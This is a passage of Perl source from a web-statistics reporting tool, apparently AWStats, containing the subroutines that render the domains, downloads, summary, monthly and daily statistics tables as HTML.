		}
		if ( $_domener_h{$key} && $bredde_h == 1 ) { $bredde_h = 2; }
		if ( $max_k > 0 ) {
			$bredde_k =
			  int( $BarWidth * ( $_domener_k{$key} || 0 ) / $max_k ) +
			  1;
		}
		if ( $_domener_k{$key} && $bredde_k == 1 ) { $bredde_k = 2; }
		my $newkey = lc($key);
		if ( $newkey eq 'ip' || !$DomainsHashIDLib{$newkey} ) {
			print
"<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/ip.png\" height=\"14\""
			  . AltTitle( _t("Unknown") )
			  . " /></td><td class=\"aws\">" . _t("Unknown") . "</td><td>$newkey</td>";
		}
		else {
			print
"<tr><td width=\"$WIDTHCOLICON\"><img src=\"$DirIcons\/flags\/$newkey.png\" height=\"14\""
			  . AltTitle("$newkey")
			  . " /></td><td class=\"aws\">$DomainsHashIDLib{$newkey}</td><td>$newkey</td>";
		}
		## to add unique visitors and number of visits, by Josep Ruano @ CAPSiDE
		if ( $ShowDomainsStats =~ /U/i ) {
			$_domener_u = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_u += ( $_domener_h{$key} / $TotalHits );
			$_domener_u =
			  sprintf( "%.0f", ( $_domener_u * $TotalUnique ) / 2 );
			print "<td>".Format_Number($_domener_u)." ("
			  . sprintf( "%.1f%", 100 * $_domener_u / $TotalUnique )
			  . ")</td>";
		}
		if ( $ShowDomainsStats =~ /V/i ) {
			$_domener_v = (
				  $_domener_p{$key}
				? $_domener_p{$key} / $TotalPages
				: 0
			);
			$_domener_v += ( $_domener_h{$key} / $TotalHits );
			$_domener_v =
			  sprintf( "%.0f", ( $_domener_v * $TotalVisits ) / 2 );
			print "<td>".Format_Number($_domener_v)." ("
			  . sprintf( "%.1f%", 100 * $_domener_v / $TotalVisits )
			  . ")</td>";
		}
		if ( $ShowDomainsStats =~ /P/i ) {
			print "<td>".Format_Number($_domener_p{$key})."</td>";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print "<td>".Format_Number($_domener_h{$key})."</td>";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes( $_domener_k{$key} ) . "</td>";
		}
		print "<td class=\"aws\">";
		if ( $ShowDomainsStats =~ /P/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"5\""
			  . AltTitle( _t("Pages") . ": " . int( $_domener_p{$key} ) )
			  . " /><br />\n";
		}
		if ( $ShowDomainsStats =~ /H/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_h\" height=\"5\""
			  . AltTitle( _t("Hits") . ": " . int( $_domener_h{$key} ) )
			  . " /><br />\n";
		}
		if ( $ShowDomainsStats =~ /B/i ) {
			print
"<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"5\""
			  . AltTitle(
				_t("Bandwidth") . ": " . Format_Bytes( $_domener_k{$key} ) )
			  . " />";
		}
		print "</td>";
		print "</tr>\n";
		$total_u += $_domener_u;
		$total_v += $_domener_v;
		$total_p += $_domener_p{$key};
		$total_h += $_domener_h{$key};
		$total_k += $_domener_k{$key} || 0;
		$count++;
	}
	$rest_u = $TotalUnique - $total_u;
	$rest_v = $TotalVisits - $total_v;
	$rest_p = $TotalPages - $total_p;
	$rest_h = $TotalHits - $total_h;
	$rest_k = $TotalBytes - $total_k;
	if (   $rest_u > 0
		|| $rest_v > 0
		|| $rest_p > 0
		|| $rest_h > 0
		|| $rest_k > 0 )
	{    # All other domains (known or not)
		print
"<tr><td width=\"$WIDTHCOLICON\">&nbsp;</td><td colspan=\"2\" class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td>";
		if ( $ShowDomainsStats =~ /U/i ) { print "<td>$rest_u</td>"; }
		if ( $ShowDomainsStats =~ /V/i ) { print "<td>$rest_v</td>"; }
		if ( $ShowDomainsStats =~ /P/i ) { print "<td>$rest_p</td>"; }
		if ( $ShowDomainsStats =~ /H/i ) { print "<td>$rest_h</td>"; }
		if ( $ShowDomainsStats =~ /B/i ) {
			print "<td>" . Format_Bytes($rest_k) . "</td>";
		}
		print "<td class=\"aws\">&nbsp;</td>";
		print "</tr>\n";
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Downloads code frame or static page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLShowDownloads{
	my $regext         = qr/\.(\w{1,6})$/;
	print "$Center<a name=\"downloads\">&nbsp;</a><br />\n";
	&tab_head( _t("Downloads"), 19, 0, "downloads" );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("Downloads") . "</th>";
	if ( $ShowFileTypesStats =~ /H/i ){print "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>"
		."<th bgcolor=\"#$color_h\" width=\"80\">206 " . _t("Hits") . "</th>"; }
	if ( $ShowFileTypesStats =~ /B/i ){
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
		print "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Average") . "</th>";
	}
	print "</tr>\n";
	my $count = 0;
	for my $u (sort {$_downloads{$b}->{'AWSTATS_HITS'} <=> $_downloads{$a}->{'AWSTATS_HITS'}}(keys %_downloads) ){
		print "<tr>";
		my $ext = Get_Extension($regext, $u);
		if ( !$ext) {
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/unknown.png\""
			  . AltTitle("")
			  . " /></td>";
		}
		else {
			my $nameicon = $MimeHashLib{$ext}[0] || "notavailable";
			my $nametype = $MimeHashFamily{$MimeHashLib{$ext}[0]} || "&nbsp;";
			print "<td"
			  . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
			  . "><img src=\"$DirIcons\/mime\/$nameicon.png\""
			  . AltTitle("")
			  . " /></td>";
		}
		print "<td class=\"aws\">";
		&HTMLShowURLInfo($u);
		print "</td>";
		if ( $ShowFileTypesStats =~ /H/i ){
			print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_HITS'})."</td>";
			print "<td>".Format_Number($_downloads{$u}->{'AWSTATS_206'})."</td>";
		}
		if ( $ShowFileTypesStats =~ /B/i ){
			print "<td>".Format_Bytes($_downloads{$u}->{'AWSTATS_SIZE'})."</td>";
			print "<td>".Format_Bytes(($_downloads{$u}->{'AWSTATS_SIZE'}/
					($_downloads{$u}->{'AWSTATS_HITS'} + $_downloads{$u}->{'AWSTATS_206'})))."</td>";
		}
		print "</tr>\n";
		$count++;
		if ($count >= $MaxRowsInHTMLOutput){last;}
	}
	&tab_end();
	&html_end(1);
}

#------------------------------------------------------------------------------
# Function:     Prints the Summary section at the top of the main page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSummary{
	if ($Debug) { debug( "ShowSummary", 2 ); }
	# FirstTime LastTime
	my $FirstTime = 0;
	my $LastTime  = 0;
	foreach my $key ( keys %FirstTime ) {
		my $keyqualified = 0;
		if ( $MonthRequired eq 'all' ) { $keyqualified = 1; }
		if ( $key =~ /^$YearRequired$MonthRequired/ ) { $keyqualified = 1; }
		if ($keyqualified) {
			if ( $FirstTime{$key}
				&& ( $FirstTime == 0 || $FirstTime > $FirstTime{$key} ) )
			{
				$FirstTime = $FirstTime{$key};
			}
			if ( $LastTime < ( $LastTime{$key} || 0 ) ) {
				$LastTime = $LastTime{$key};
			}
		}
	}
			
	#print "$Center<a name=\"summary\">&nbsp;</a><br />\n";
	my $title = "📊 " . _t("Report Overview");
	&tab_head( "$title", 0, 0, 'month' );

	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
	my $NewLinkTarget = '';

	if ( $FrameName eq 'mainright' ) {
		$NewLinkTarget = " target=\"_parent\"";
	}

	# Ratio
	my $RatioVisits = 0;
	my $RatioPages  = 0;
	my $RatioHits   = 0;
	my $RatioBytes  = 0;
	if ( $TotalUnique > 0 ) {
		$RatioVisits = int( $TotalVisits / $TotalUnique * 100 ) / 100;
	}
	if ( $TotalVisits > 0 ) {
		$RatioPages = int( $TotalPages / $TotalVisits * 100 ) / 100;
	}
	if ( $TotalVisits > 0 ) {
		$RatioHits = int( $TotalHits / $TotalVisits * 100 ) / 100;
	}
	if ( $TotalVisits > 0 ) {
		$RatioBytes =
		  int( ( $TotalBytes / 1024 ) * 100 /
			  ( $LogType eq 'M' ? $TotalHits : $TotalVisits ) ) / 100;
	}

	my $colspan = 5;
	my $w       = '20';
	if ( $LogType eq 'W' || $LogType eq 'S' ) {
		$w       = '17';
		$colspan = 6;
	}

	# Show first/last
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td class=\"aws\"><b>" . _t("Period") . "</b></td><td class=\"aws\" colspan=\""
	  . ( $colspan - 1 ) . "\">\n";
	print( $MonthRequired eq 'all'
		? sprintf(_t("date_format_year"), $YearRequired)
		: sprintf(_t("date_format_month"), $MonthNumLib{$MonthRequired}, $YearRequired)
	);
	print "</td></tr>\n";
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td class=\"aws\"><b>" . _t("First visit") . "</b></td>\n";
	print "<td class=\"aws\" colspan=\""
	  . ( $colspan - 1 ) . "\">"
	  . ( $FirstTime ? Format_Date( $FirstTime, 0 ) : "NA" ) . "</td>";
	print "</tr>\n";
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<td class=\"aws\"><b>" . _t("Last visit") . "</b></td>\n";
	print "<td class=\"aws\" colspan=\""
	  . ( $colspan - 1 ) . "\">"
	  . ( $LastTime ? Format_Date( $LastTime, 0 ) : "NA" )
	  . "</td>\n";
	print "</tr>\n";

	# Show main indicators title row
	print "<tr>";
	if ( $LogType eq 'W' || $LogType eq 'S' ) {
		print "<td bgcolor=\"#$color_TableBGTitle\">&nbsp;</td>";
	}
	if ( $ShowSummary =~ /U/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_u\""
		  . Tooltip(2)
		  . ">" . _t("Unique visitors") . "</td>";
	}
	else {
		print
"<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
	}
	if ( $ShowSummary =~ /V/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_v\""
		  . Tooltip(1)
		  . ">" . _t("Visits") . "</td>";
	}
	else {
		print
"<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
	}
	if ( $ShowSummary =~ /P/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_p\""
		  . Tooltip(3)
		  . ">" . _t("Pages") . "</td>";
	}
	else {
		print
"<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
	}
	if ( $ShowSummary =~ /H/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_h\""
		  . Tooltip(4)
		  . ">" . _t("Hits") . "</td>";
	}
	else {
		print
"<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
	}
	if ( $ShowSummary =~ /B/i ) {
		print "<td width=\"$w%\" bgcolor=\"#$color_k\""
		  . Tooltip(5)
		  . ">" . _t("Bandwidth") . "</td>";
	}
	else {
		print
"<td bgcolor=\"#$color_TableBGTitle\" width=\"20%\">&nbsp;</td>";
	}
	print "</tr>\n";

	# Show main indicators values for viewed traffic
	print "<tr>";
	if ( $LogType eq 'M' ) {
		print "<td class=\"aws\">" . _t("Viewed") . "</td>";
		print "<td>&nbsp;<br />&nbsp;</td>\n";
		print "<td>&nbsp;<br />&nbsp;</td>\n";
		if ( $ShowSummary =~ /H/i ) {
			print "<td><b>".Format_Number($TotalHits)."</b>"
			  . (
				$LogType eq 'M'
				? ""
				: "<br />($RatioHits&nbsp;"
				  . _t("Hits") . "/" . _t("Visits") . ")"
			  )
			  . "</td>";
		}
		else { print "<td>&nbsp;</td>"; }
		if ( $ShowSummary =~ /B/i ) {
			print "<td><b>"
			  . Format_Bytes( int($TotalBytes) )
			  . "</b><br />($RatioBytes&nbsp;" . _t("KB/Visits") . ")</td>";
		}
		else { print "<td>&nbsp;</td>"; }
	}
	else {
		if ( $LogType eq 'W' || $LogType eq 'S' ) {
			print "<td class=\"aws\">" . _t("Viewed traffic *") . "</td>";
		}
		if ( $ShowSummary =~ /U/i ) {
			print "<td>"
			  . (
				$MonthRequired eq 'all'
				? "<b>&lt;= ".Format_Number($TotalUnique)."</b><br />" . _t("Unique")
				: "<b>".Format_Number($TotalUnique)."</b><br />&nbsp;"
			  )
			  . "</td>";
		}
		else { print "<td>&nbsp;</td>"; }
		if ( $ShowSummary =~ /V/i ) {
			print
"<td><b>".Format_Number($TotalVisits)."</b><br />(" . $RatioVisits . "&nbsp;" . _t("Visits/Visitor") . ")</td>";
		}
		else { print "<td>&nbsp;</td>"; }
		if ( $ShowSummary =~ /P/i ) {
			print "<td><b>".Format_Number($TotalPages)."</b><br />(" . $RatioPages . "&nbsp;"
			  . _t("Pages/Visit") . ")</td>";
		}
		else { print "<td>&nbsp;</td>"; }
		if ( $ShowSummary =~ /H/i ) {
			print "<td><b>".Format_Number($TotalHits)."</b>"
			  . (
				$LogType eq 'M'
				? ""
				: "<br />(" . $RatioHits . "&nbsp;"
				  . _t("Hits/Visit") . ")"
			  )
			  . "</td>";
		}
		else { print "<td>&nbsp;</td>"; }
		if ( $ShowSummary =~ /B/i ) {
			print "<td><b>"
			  . Format_Bytes( int($TotalBytes) )
			  . "</b><br />(" . $RatioBytes . "&nbsp;" . _t("KB/Visit") . ")</td>";
		}
		else { print "<td>&nbsp;</td>"; }
	}
	print "</tr>\n";

	# Show main indicators values for not viewed traffic values
	if ( $LogType eq 'M' || $LogType eq 'W' || $LogType eq 'S' ) {
		print "<tr>";
		if ( $LogType eq 'M' ) {
			print "<td class=\"aws\">" . _t("Not viewed") . "</td>";
			print "<td>&nbsp;<br />&nbsp;</td>\n";
			print "<td>&nbsp;<br />&nbsp;</td>\n";
			if ( $ShowSummary =~ /H/i ) {
				print "<td><b>".Format_Number($TotalNotViewedHits)."</b></td>";
			}
			else { print "<td>&nbsp;</td>"; }
			if ( $ShowSummary =~ /B/i ) {
				print "<td><b>"
				  . Format_Bytes( int($TotalNotViewedBytes) )
				  . "</b></td>";
			}
			else { print "<td>&nbsp;</td>"; }
		}
		else {
			if ( $LogType eq 'W' || $LogType eq 'S' ) {
				print "<td class=\"aws\">" . _t("Not viewed traffic *") . "</td>";
			}
			print "<td colspan=\"2\">&nbsp;<br />&nbsp;</td>\n";
			if ( $ShowSummary =~ /P/i ) {
				print "<td><b>".Format_Number($TotalNotViewedPages)."</b></td>";
			}
			else { print "<td>&nbsp;</td>"; }
			if ( $ShowSummary =~ /H/i ) {
				print "<td><b>".Format_Number($TotalNotViewedHits)."</b></td>";
			}
			else { print "<td>&nbsp;</td>"; }
			if ( $ShowSummary =~ /B/i ) {
				print "<td><b>"
				  . Format_Bytes( int($TotalNotViewedBytes) )
				  . "</b></td>";
			}
			else { print "<td>&nbsp;</td>"; }
		}
		print "</tr>\n";
	}
	&tab_end($LogType eq 'W'
		  || $LogType eq 'S' ? "* " . _t("Viewed traffic includes page views, hits and bandwidth on pages") : "" );
}

#------------------------------------------------------------------------------
# Function:     Prints the Monthly section on the main page
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainMonthly{
	if ($Debug) { debug( "ShowMonthStats", 2 ); }
	print "$Center<a name=\"month\">&nbsp;</a><br />\n";
	my $title = "📊 " . _t("Monthly Statistics");
	&tab_head( "$title", 0, 0, 'month' );
	print "<tr><td align=\"center\">\n";
	print "<center>\n";

	my $average_nb = my $average_u = my $average_v = my $average_p = 0;
	my $average_h = my $average_k = 0;
	my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
	my $max_v = my $max_p = my $max_h = my $max_k = 1;

	# Define total and max
	for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
		my $monthix = sprintf( "%02s", $ix );
		$total_u += $MonthUnique{ $YearRequired . $monthix } || 0;
		$total_v += $MonthVisits{ $YearRequired . $monthix } || 0;
		$total_p += $MonthPages{ $YearRequired . $monthix }  || 0;
		$total_h += $MonthHits{ $YearRequired . $monthix }   || 0;
		$total_k += $MonthBytes{ $YearRequired . $monthix }  || 0;

#if (($MonthUnique{$YearRequired.$monthix}||0) > $max_v) { $max_v=$MonthUnique{$YearRequired.$monthix}; }
		if (
			( $MonthVisits{ $YearRequired . $monthix } || 0 ) > $max_v )
		{
			$max_v = $MonthVisits{ $YearRequired . $monthix };
		}

#if (($MonthPages{$YearRequired.$monthix}||0) > $max_p)  { $max_p=$MonthPages{$YearRequired.$monthix}; }
		if ( ( $MonthHits{ $YearRequired . $monthix } || 0 ) > $max_h )
		{
			$max_h = $MonthHits{ $YearRequired . $monthix };
		}
		if ( ( $MonthBytes{ $YearRequired . $monthix } || 0 ) > $max_k )
		{
			$max_k = $MonthBytes{ $YearRequired . $monthix };
		}
	}

	# Define average
	# TODO

	# Show bars for month
	my $graphdone=0;
	foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
	{
		my @blocklabel = ();
		for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
			push @blocklabel,
			  "$MonthNumLib{$monthix}\n$YearRequired";
		}
		my @vallabel = (
			_t("Unique visitors"), _t("Visits"),
			_t("Pages"), _t("Hits"),
			_t("Bandwidth")
		);
		my @valcolor =
		  ( "$color_u", "$color_v", "$color_p", "$color_h",
			"$color_k" );
		my @valmax = ( $max_v, $max_v, $max_h, $max_h, $max_k );
		my @valtotal =
		  ( $total_u, $total_v, $total_p, $total_h, $total_k );
		my @valaverage = ();

		#my @valaverage=($average_v,$average_p,$average_h,$average_k);
		my @valdata = ();
		my $xx      = 0;
		for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
			$valdata[ $xx++ ] = $MonthUnique{ $YearRequired . $monthix }
			  || 0;
			$valdata[ $xx++ ] = $MonthVisits{ $YearRequired . $monthix }
			  || 0;
			$valdata[ $xx++ ] = $MonthPages{ $YearRequired . $monthix }
			  || 0;
			$valdata[ $xx++ ] = $MonthHits{ $YearRequired . $monthix }
			  || 0;
			$valdata[ $xx++ ] = $MonthBytes{ $YearRequired . $monthix }
			  || 0;
		}
		
		my $function = "ShowGraph_$pluginname";
		&$function(
			"$title",        "month",
			$ShowMonthStats, \@blocklabel,
			\@vallabel,      \@valcolor,
			\@valmax,        \@valtotal,
			\@valaverage,    \@valdata
		);
		$graphdone=1;
	}
	if (! $graphdone)
	{
		print "<table>\n";
		print "<tr valign=\"bottom\">";
		print "<td>&nbsp;</td>\n";
		for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
			my $monthix  = sprintf( "%02s", $ix );
			my $bredde_u = 0;
			my $bredde_v = 0;
			my $bredde_p = 0;
			my $bredde_h = 0;
			my $bredde_k = 0;
			if ( $max_v > 0 ) {
				$bredde_u =
				  int(
					( $MonthUnique{ $YearRequired . $monthix } || 0 ) /
					  $max_v * $BarHeight ) + 1;
			}
			if ( $max_v > 0 ) {
				$bredde_v =
				  int(
					( $MonthVisits{ $YearRequired . $monthix } || 0 ) /
					  $max_v * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_p =
				  int(
					( $MonthPages{ $YearRequired . $monthix } || 0 ) /
					  $max_h * $BarHeight ) + 1;
			}
			if ( $max_h > 0 ) {
				$bredde_h =
				  int( ( $MonthHits{ $YearRequired . $monthix } || 0 ) /
					  $max_h * $BarHeight ) + 1;
			}
			if ( $max_k > 0 ) {
				$bredde_k =
				  int(
					( $MonthBytes{ $YearRequired . $monthix } || 0 ) /
					  $max_k * $BarHeight ) + 1;
			}
			print "<td>";
			if ( $ShowMonthStats =~ /U/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vu'}\" height=\"$bredde_u\" width=\"6\""
				  . AltTitle( _t("Unique visitors") . ": "
					  . ( $MonthUnique{ $YearRequired . $monthix }
						  || 0 ) )
				  . " />";
			}
			if ( $ShowMonthStats =~ /V/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vv'}\" height=\"$bredde_v\" width=\"6\""
				  . AltTitle( _t("Visits") . ": "
					  . ( $MonthVisits{ $YearRequired . $monthix }
						  || 0 ) )
				  . " />";
			}
			if ( $ShowMonthStats =~ /P/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vp'}\" height=\"$bredde_p\" width=\"6\""
				  . AltTitle( _t("Pages") . ": "
					  . ( $MonthPages{ $YearRequired . $monthix } || 0 )
				  )
				  . " />";
			}
			if ( $ShowMonthStats =~ /H/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vh'}\" height=\"$bredde_h\" width=\"6\""
				  . AltTitle( _t("Hits") . ": "
					  . ( $MonthHits{ $YearRequired . $monthix } || 0 )
				  )
				  . " />";
			}
			if ( $ShowMonthStats =~ /B/i ) {
				print
"<img align=\"bottom\" src=\"$DirIcons\/other\/$BarPng{'vk'}\" height=\"$bredde_k\" width=\"6\""
					  . AltTitle(
					_t("Bandwidth") . ": "
					  . Format_Bytes(
						$MonthBytes{ $YearRequired . $monthix }
					  )
				  )
				  . " />";
			}
			print "</td>\n";
		}
		print "<td>&nbsp;</td>";
		print "</tr>\n";

		# Show lib for month
		print "<tr valign=\"middle\">";

		#if (!$StaticLinks) {
		#	print "<td><a href=\"".XMLEncode("$AWScript${NewLinkParams}month=12&year=".($YearRequired-1))."\">&lt;&lt;</a></td>";
		#}
		#else {
		print "<td>&nbsp;</td>";

		#				}
		for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );

#			if (!$StaticLinks) {
#				print "<td><a href=\"".XMLEncode("$AWScript${NewLinkParams}month=$monthix&year=$YearRequired")."\">$MonthNumLib{$monthix}<br />$YearRequired</a></td>";
#			}
#			else {
			print "<td>"
			  . (
				!$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear
				? '<span class="currentday">'
				: ''
			  );
			print sprintf(_t("date_format_month"), $MonthNumLib{$monthix}, $YearRequired);
			print(   !$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear ? '</span>' : '' );
			print "</td>";

			#					}
		}

#		if (!$StaticLinks) {
#			print "<td><a href=\"".XMLEncode("$AWScript${NewLinkParams}month=1&year=".($YearRequired+1))."\">&gt;&gt;</a></td>";
#		}
#		else {
		print "<td>&nbsp;</td>";

		#				}
		print "</tr>\n";
		print "</table>\n";
	}
	print "<br />\n";

	# Show data array for month
	if ($AddDataArrayMonthStats) {
		print "<table>\n";
		print
"<tr><td width=\"80\" bgcolor=\"#$color_TableBGRowTitle\">" . _t("Month") . "</td>";
		if ( $ShowMonthStats =~ /U/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_u\""
			  . Tooltip(2)
			  . ">" . _t("Unique visitors") . "</td>";
		}
		if ( $ShowMonthStats =~ /V/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_v\""
			  . Tooltip(1)
			  . ">" . _t("Visits") . "</td>";
		}
		if ( $ShowMonthStats =~ /P/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_p\""
			  . Tooltip(3)
			  . ">" . _t("Pages") . "</td>";
		}
		if ( $ShowMonthStats =~ /H/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_h\""
			  . Tooltip(4)
			  . ">" . _t("Hits") . "</td>";
		}
		if ( $ShowMonthStats =~ /B/i ) {
			print "<td width=\"80\" bgcolor=\"#$color_k\""
			  . Tooltip(5)
			  . ">" . _t("Bandwidth") . "</td>";
		}
		print "</tr>\n";
		for ( my $ix = 1 ; $ix <= 12 ; $ix++ ) {
			my $monthix = sprintf( "%02s", $ix );
			print "<tr>";
			print "<td>"
			  . (
				!$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear
				? '<span class="currentday">'
				: ''
			  );
			print "$MonthNumLib{$monthix} $YearRequired";
			print(   !$StaticLinks
				  && $monthix == $nowmonth
				  && $YearRequired == $nowyear ? '</span>' : '' );
			print "</td>";
			if ( $ShowMonthStats =~ /U/i ) {
				print "<td>",
				  Format_Number($MonthUnique{ $YearRequired . $monthix }
				  ? $MonthUnique{ $YearRequired . $monthix }
				  : "0"), "</td>";
			}
			if ( $ShowMonthStats =~ /V/i ) {
				print "<td>",
				  Format_Number($MonthVisits{ $YearRequired . $monthix }
				  ? $MonthVisits{ $YearRequired . $monthix }
				  : "0"), "</td>";
			}
			if ( $ShowMonthStats =~ /P/i ) {
				print "<td>",
				  Format_Number($MonthPages{ $YearRequired . $monthix }
				  ? $MonthPages{ $YearRequired . $monthix }
				  : "0"), "</td>";
			}
			if ( $ShowMonthStats =~ /H/i ) {
				print "<td>",
				  Format_Number($MonthHits{ $YearRequired . $monthix }
				  ? $MonthHits{ $YearRequired . $monthix }
				  : "0"), "</td>";
			}
			if ( $ShowMonthStats =~ /B/i ) {
				print "<td>",
				  Format_Bytes(
					int( $MonthBytes{ $YearRequired . $monthix } || 0 )
				  ), "</td>";
			}
			print "</tr>\n";
		}

		# Average row
		# TODO
		# Total row
		print
"<tr><td bgcolor=\"#$color_TableBGRowTitle\">" . _t("Total") . "</td>";
		if ( $ShowMonthStats =~ /U/i ) {
			print
			  "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_u)."</td>";
		}
		if ( $ShowMonthStats =~ /V/i ) {
			print
			  "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_v)."</td>";
		}
		if ( $ShowMonthStats =~ /P/i ) {
			print
			  "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_p)."</td>";
		}
		if ( $ShowMonthStats =~ /H/i ) {
			print
			  "<td bgcolor=\"#$color_TableBGRowTitle\">".Format_Number($total_h)."</td>";
		}
		if ( $ShowMonthStats =~ /B/i ) {
			print "<td bgcolor=\"#$color_TableBGRowTitle\">"
			  . Format_Bytes($total_k) . "</td>";
		}
		print "</tr>\n";
		print "</table>\n<br />\n";
	}

	print "</center>\n";
	print "</td></tr>\n";
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Daily section on the main page
# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage
#				$firstdaytoshowtime, $lastdaytoshowtime
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainDaily{
	my $firstdaytocountaverage = shift;
	my $lastdaytocountaverage = shift;
	my $firstdaytoshowtime = shift;
	my $lastdaytoshowtime = shift;
	
	if ($Debug) { debug( "ShowDaysOfMonthStats", 2 ); }
	print "$Center<a name=\"daysofmonth\">&nbsp;</a><br />\n";

	my $NewLinkParams = ${QueryString};
	$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
	$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
	$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
	$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
	$NewLinkParams =~ s/^&amp;//;
	$NewLinkParams =~ s/&amp;$//;
	if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
	my $NewLinkTarget = '';

	if ( $FrameName eq 'mainright' ) {
		$NewLinkTarget = " target=\"_parent\"";
	}

	my $title = "📅 " . _t("Daily Statistics");

    if ($AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
            $title = "$title &nbsp; - &nbsp; <a href=\"".(XMLEncode(
                "$AddLinkToExternalCGIWrapper". "?section=DAY&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }

	&tab_head( "$title", 0, 0, 'daysofmonth' );
	print "<tr>";
	print "<td align=\"center\">\n";
	print "<center>\n";
	
	my $average_v = my $average_p = 0;
	my $average_h = my $average_k = 0;
	my $total_u = my $total_v = my $total_p = my $total_h = my $total_k = 0;
	my $max_v = my $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1
	foreach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )
	{
		$daycursor =~ /^(\d\d\d\d)(\d\d)(\d\d)/;
		my $year  = $1;
		my $month = $2;
		my $day   = $3;
		if ( !DateIsValid( $day, $month, $year ) ) {
			next;
		}    # If not an existing day, go to next
		$total_v += $DayVisits{ $year . $month . $day } || 0;
		$total_p += $DayPages{ $year . $month . $day }  || 0;
		$total_h += $DayHits{ $year . $month . $day }   || 0;
		$total_k += $DayBytes{ $year . $month . $day }  || 0;
